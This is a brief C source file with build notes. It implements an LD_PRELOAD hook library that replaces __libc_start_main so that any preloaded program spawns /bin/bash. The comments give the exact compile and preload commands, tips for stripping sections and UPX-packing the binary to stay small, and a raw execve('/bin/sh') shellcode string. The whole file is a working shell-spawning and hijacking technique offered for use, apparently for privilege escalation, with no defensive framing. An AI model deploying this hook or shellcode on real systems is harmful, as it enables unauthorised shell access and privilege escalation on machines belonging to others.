#include <stdlib.h>


// Notes
// gcc -shared -fPIC -ffunction-sections -Wl,--gc-sections -nostdlib hook_lib.c -o hook_lib.so
// LD_PRELOAD=./hook_lib.so /bin/true

// objcopy --remove-section "section_name" "executable"
// UPX for executables.  has to be less than 40kB

// shellcode for execve
// \xeb\x16\x5f\x48\x31\xc0\x88\x67\x07\x48\x89\x7f\x08\x48\x8d\x77\x08\x48\x8d\x10\xb0\x3b\x0f\x05\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68

int __libc_start_main(int (*main) (int, char **, char **), int argc, char **ubp_av, void(*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (*stack_end)) {
	char *const parmList[] = {"/bin/bash", NULL};
	char *const envParms = {NULL};
	execve("/bin/bash", parmList, envParms);
	return 0;
}
